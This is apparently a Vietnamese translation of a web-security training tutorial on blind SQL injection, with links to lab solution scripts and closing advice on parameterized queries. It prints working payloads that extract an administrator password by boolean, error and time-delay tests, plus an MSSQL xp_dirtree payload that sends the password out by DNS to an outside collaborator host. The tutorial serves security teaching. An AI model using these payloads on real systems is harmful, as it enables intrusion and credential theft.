# Tấn công SQL injection mù  
Trong phần này, chúng tôi mô tả các kỹ thuật tìm kiếm và khai thác các lỗ hổng tấn công SQL injection ẩn.  
# Tấn công SQL injection mù là gì?  
Lỗi tấn công SQL injection mù xảy ra khi một ứng dụng dễ bị tấn công SQL injection, nhưng phản hồi HTTP của nó không chứa kết quả của truy vấn SQL liên quan hoặc chi tiết về bất kỳ lỗi nào trong cơ sở dữ liệu.  

Nhiều kỹ thuật `UNION` tấn công không hiệu quả với các lỗ hổng SQL injection mù. Điều này là do chúng dựa vào khả năng nhìn thấy kết quả của truy vấn được chèn vào trong phản hồi của ứng dụng. Vẫn có thể khai thác SQL injection mù để truy cập dữ liệu trái phép, nhưng phải sử dụng các kỹ thuật khác.  
# Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt các phản hồi có điều kiện  
Hãy xem xét một ứng dụng sử dụng cookie theo dõi để thu thập dữ liệu phân tích về việc sử dụng. Các yêu cầu gửi đến ứng dụng bao gồm tiêu đề cookie như sau:  

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`  

Khi một yêu cầu chứa `TrackingIdcookie` được xử lý, ứng dụng sẽ sử dụng truy vấn SQL để xác định xem đây có phải là người dùng đã biết hay không:  

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`  

Truy vấn này dễ bị tấn công SQL injection, nhưng kết quả truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng sẽ hoạt động khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một truy vấn được nhận dạng `TrackingId` , truy vấn sẽ trả về dữ liệu và bạn nhận được thông báo "Welcome" trong phản hồi.  
Hành vi này đủ để khai thác lỗ hổng tấn công SQL injection mù. Bạn có thể lấy thông tin bằng cách kích hoạt các phản hồi khác nhau tùy thuộc vào điều kiện được chèn vào.  
`TrackingId` Để hiểu cách thức hoạt động của lỗ hổng này, giả sử có hai yêu cầu được gửi đi lần lượt, mỗi yêu cầu chứa các giá trị cookie sau :  
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

* Giá trị đầu tiên trong số này khiến truy vấn trả về kết quả, vì `AND '1'='1` điều kiện được chèn vào là đúng. Kết quả là, thông báo "Welcome" được hiển thị.  
* Giá trị thứ hai khiến truy vấn không trả về bất kỳ kết quả nào, vì điều kiện được chèn vào là sai. Thông báo "Welcome" không được hiển thị.  

Điều này cho phép chúng ta xác định câu trả lời cho bất kỳ điều kiện nào được đưa vào và trích xuất dữ liệu từng phần một.  
Ví dụ, giả sử có một bảng tên là `Users` với các cột `Username` và `Password`, và một người dùng tên là `Administrator`. Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một loạt các đầu vào để kiểm tra mật khẩu từng ký tự một.  

Để thực hiện điều này, hãy bắt đầu với dữ liệu đầu vào sau: 

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`  

Thao tác này trả về thông báo "Welcome", cho biết điều kiện được chèn vào là đúng, và do đó ký tự đầu tiên của mật khẩu lớn hơn m.  
Tiếp theo, chúng ta gửi dữ liệu đầu vào sau:  

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't` 

Điều này không trả về thông báo "Welcome", cho thấy điều kiện được chèn vào là sai, và do đó ký tự đầu tiên của mật khẩu không lớn hơn t.  
Cuối cùng, chúng ta gửi dữ liệu đầu vào sau, và nhận lại thông báo "Welcome", qua đó xác nhận rằng ký tự đầu tiên của mật khẩu là s:  

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`  

Chúng ta có thể tiếp tục quy trình này để xác định một cách có hệ thống mật khẩu đầy đủ của `Administrator` người dùng.  

### Bài thực hành: Tấn công SQL injection mù với phản hồi có điều kiện  
[SOLUTION](./solution/lab10.py)
# Lỗi tấn công SQL injection dựa trên lỗi  
Tấn công SQL injection dựa trên lỗi đề cập đến các trường hợp mà bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy luận dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong ngữ cảnh ẩn danh. Khả năng này phụ thuộc vào cấu hình của cơ sở dữ liệu và loại lỗi mà bạn có thể kích hoạt:

* Bạn có thể khiến ứng dụng trả về một phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức boolean. Bạn có thể khai thác điều này theo cách tương tự như các phản hồi có điều kiện mà chúng ta đã xem xét trong phần trước. Để biết thêm thông tin, hãy xem Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt lỗi có điều kiện .
* Bạn có thể kích hoạt các thông báo lỗi hiển thị dữ liệu được trả về bởi truy vấn. Điều này giúp biến các lỗ hổng tấn công SQL injection khó phát hiện thành các lỗ hổng dễ nhận biết. Để biết thêm thông tin, hãy xem phần Trích xuất dữ liệu nhạy cảm thông qua các thông báo lỗi SQL chi tiết .  
## Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt lỗi có điều kiện  
Một số ứng dụng thực hiện các truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật trong phần trước sẽ không hiệu quả, bởi vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt nào đối với phản hồi của ứng dụng.  

Thường thì có thể khiến ứng dụng trả về phản hồi khác nhau tùy thuộc vào việc có xảy ra lỗi SQL hay không. Bạn có thể sửa đổi truy vấn để nó chỉ gây ra lỗi cơ sở dữ liệu nếu điều kiện đúng. Rất thường xuyên, một lỗi không được xử lý từ cơ sở dữ liệu sẽ gây ra một số khác biệt trong phản hồi của ứng dụng, chẳng hạn như thông báo lỗi. Điều này cho phép bạn suy ra tính đúng sai của điều kiện được đưa vào.  

Để hiểu cách thức hoạt động này, giả sử có hai yêu cầu được gửi đi `TrackingId` lần lượt, mỗi yêu cầu chứa các giá trị cookie sau:  
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Các tham số đầu vào này sử dụng `CASE` từ khóa để kiểm tra một điều kiện và trả về một biểu thức khác nhau tùy thuộc vào việc biểu thức đó đúng hay sai:  
* Với dữ liệu đầu vào đầu tiên, `CASE` biểu thức được đánh giá là `'a'` , điều này không gây ra lỗi nào.
* Với đầu vào thứ hai, nó được đánh giá thành `1/0`, dẫn đến lỗi chia cho 0.  
  
Nếu lỗi gây ra sự khác biệt trong phản hồi HTTP của ứng dụng, bạn có thể sử dụng điều này để xác định xem điều kiện được chèn vào có đúng hay không.  

Sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:  

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`  

### Bài thực hành: Tấn công SQL injection mù với lỗi điều kiện  
[SOLUTION](./solution/lab11.py)
## Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết  
Việc cấu hình sai cơ sở dữ liệu đôi khi dẫn đến các thông báo lỗi dài dòng. Những thông tin này có thể hữu ích cho kẻ tấn công. Ví dụ, hãy xem xét thông báo lỗi sau, xuất hiện sau khi chèn dấu ngoặc đơn vào một `id` tham số:  

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  

Điều này cho thấy toàn bộ truy vấn mà ứng dụng đã xây dựng bằng cách sử dụng dữ liệu đầu vào của chúng ta. Chúng ta có thể thấy rằng trong trường hợp này, chúng ta đang chèn mã độc vào một chuỗi được đặt trong dấu ngoặc đơn bên trong một `WHERE` câu lệnh. Điều này giúp dễ dàng xây dựng một truy vấn hợp lệ chứa mã độc hại. Việc bỏ chú thích phần còn lại của truy vấn sẽ ngăn dấu ngoặc đơn thừa làm hỏng cú pháp.  

Đôi khi, bạn có thể khiến ứng dụng tạo ra thông báo lỗi chứa một số dữ liệu được trả về bởi truy vấn. Điều này biến một lỗ hổng tấn công SQL injection khó phát hiện thành một lỗ hổng dễ nhận biết.  

Bạn có thể sử dụng `CAST()` hàm này để thực hiện việc đó. Nó cho phép bạn chuyển đổi một kiểu dữ liệu sang kiểu dữ liệu khác. Ví dụ, hãy tưởng tượng một truy vấn chứa câu lệnh sau:  

`CAST((SELECT example_column FROM example_table) AS int)`  

Thông thường, dữ liệu bạn đang cố gắng đọc là một chuỗi ký tự. Việc cố gắng chuyển đổi chuỗi ký tự này sang một kiểu dữ liệu không tương thích, chẳng hạn như kiểu dữ liệu số nguyên `int`, có thể gây ra lỗi tương tự như sau:  

`ERROR: invalid input syntax for type integer: "Example data"`  

Loại truy vấn này cũng có thể hữu ích nếu giới hạn ký tự ngăn cản bạn kích hoạt các phản hồi có điều kiện.  

### Bài thực hành: Tấn công SQL injection dựa trên lỗi hiển thị  
[SOLUTION](./solution/lab12.py)
# Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt độ trễ thời gian  
Nếu ứng dụng bắt được lỗi cơ sở dữ liệu khi thực thi truy vấn SQL và xử lý chúng một cách khéo léo, thì phản hồi của ứng dụng sẽ không có gì khác biệt. Điều này có nghĩa là kỹ thuật tạo lỗi có điều kiện trước đó sẽ không hoạt động.  

Trong trường hợp này, thường có thể khai thác lỗ hổng tấn công SQL injection mù bằng cách tạo ra độ trễ thời gian tùy thuộc vào việc điều kiện được chèn vào là đúng hay sai. Vì các truy vấn SQL thường được ứng dụng xử lý đồng bộ, việc trì hoãn thực thi truy vấn SQL cũng làm trì hoãn phản hồi HTTP. Điều này cho phép bạn xác định tính đúng sai của điều kiện được chèn vào dựa trên thời gian nhận được phản hồi HTTP.  

Các kỹ thuật để kích hoạt độ trễ thời gian phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, trên Microsoft SQL Server, bạn có thể sử dụng đoạn mã sau để kiểm tra một điều kiện và kích hoạt độ trễ tùy thuộc vào việc biểu thức đó có đúng hay không:  

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* Đầu tiên trong số các tín hiệu đầu vào này không gây ra độ trễ, vì điều kiện `1=2` là sai.
* Tín hiệu đầu vào thứ hai gây ra độ trễ 10 giây, vì điều kiện `1=1` là đúng.  

Sử dụng kỹ thuật này, chúng ta có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:  

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`  

### Bài thực hành: Tấn công SQL injection mù với độ trễ thời gian  

### Bài thực hành: Tấn công SQL injection mù với độ trễ thời gian và truy xuất thông tin  

# Khai thác lỗ hổng SQL injection mù bằng kỹ thuật ngoài băng tần (OAST)  
Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước nhưng thực hiện bất đồng bộ. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong luồng ban đầu và sử dụng một luồng khác để thực hiện truy vấn SQL bằng cách sử dụng cookie theo dõi. Truy vấn vẫn dễ bị tấn công SQL injection, nhưng không có kỹ thuật nào được mô tả cho đến nay sẽ hiệu quả. Phản hồi của ứng dụng không phụ thuộc vào việc truy vấn có trả về dữ liệu nào không, lỗi cơ sở dữ liệu có xảy ra hay không, hoặc thời gian thực hiện truy vấn có kéo dài bao lâu.  

Trong tình huống này, thường có thể khai thác lỗ hổng tấn công SQL injection mù bằng cách kích hoạt các tương tác mạng ngoài luồng đến hệ thống mà bạn kiểm soát. Các tương tác này có thể được kích hoạt dựa trên một điều kiện được chèn vào để suy luận thông tin từng phần một. Hữu ích hơn, dữ liệu có thể được đánh cắp trực tiếp trong quá trình tương tác mạng.  

Có thể sử dụng nhiều giao thức mạng khác nhau cho mục đích này, nhưng thông thường hiệu quả nhất là DNS (dịch vụ tên miền). Nhiều mạng sản xuất cho phép truy vấn DNS đi ra tự do, vì chúng rất cần thiết cho hoạt động bình thường của các hệ thống sản xuất.  

Công cụ dễ sử dụng và đáng tin cậy nhất để thực hiện các kỹ thuật tấn công ngoài băng tần là Burp Collaborator . Đây là một máy chủ cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm cả DNS. Nó cho phép bạn phát hiện khi nào các tương tác mạng xảy ra do việc gửi các gói dữ liệu riêng lẻ đến một ứng dụng dễ bị tổn thương. Burp Suite Professional bao gồm một máy khách tích hợp sẵn được cấu hình để hoạt động với Burp Collaborator ngay từ đầu. Để biết thêm thông tin, hãy xem tài liệu hướng dẫn của Burp Collaborator .  

Các kỹ thuật để kích hoạt truy vấn DNS phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, đầu vào sau trên Microsoft SQL Server có thể được sử dụng để gây ra tra cứu DNS trên một tên miền cụ thể:  

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`  

Điều này khiến cơ sở dữ liệu thực hiện tra cứu cho miền sau:  
`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`  

Bạn có thể sử dụng Burp Collaborator để tạo một tên miền phụ duy nhất và liên tục kiểm tra máy chủ Collaborator để xác nhận khi nào có bất kỳ yêu cầu tra cứu DNS nào được thực hiện.  

### Bài thực hành: Tấn công SQL injection mù với tương tác ngoài băng tần  

Sau khi xác nhận được cách thức kích hoạt tương tác ngoài băng tần, bạn có thể sử dụng kênh ngoài băng tần đó để trích xuất dữ liệu từ ứng dụng dễ bị tổn thương. Ví dụ:  
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`  

Đầu vào này đọc mật khẩu của `Administrator` người dùng, thêm một tên miền phụ duy nhất của Collaborator và kích hoạt tra cứu DNS. Tra cứu này cho phép bạn xem mật khẩu đã được thu thập:  
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`  

Các kỹ thuật tấn công ngoài băng tần (OAST) là một phương pháp mạnh mẽ để phát hiện và khai thác lỗ hổng SQL injection mù, nhờ vào tỷ lệ thành công cao và khả năng trực tiếp đánh cắp dữ liệu trong kênh tấn công ngoài băng tần. Vì lý do này, các kỹ thuật OAST thường được ưu tiên ngay cả trong những trường hợp các kỹ thuật khai thác mù khác cũng có hiệu quả.  

### Bài thực hành: Tấn công SQL injection mù với rò rỉ dữ liệu ngoài luồng  

# Làm thế nào để ngăn chặn các cuộc tấn công SQL injection mù?  

Mặc dù các kỹ thuật cần thiết để tìm và khai thác lỗ hổng tấn công SQL injection mù khác biệt và phức tạp hơn so với tấn công SQL injection thông thường, nhưng các biện pháp cần thiết để ngăn chặn tấn công SQL injection lại giống nhau.  

Cũng giống như các cuộc tấn công SQL injection thông thường, các cuộc tấn công SQL injection mù có thể được ngăn chặn bằng cách sử dụng cẩn thận các truy vấn tham số hóa, đảm bảo rằng đầu vào của người dùng không thể can thiệp vào cấu trúc của truy vấn SQL dự định.  

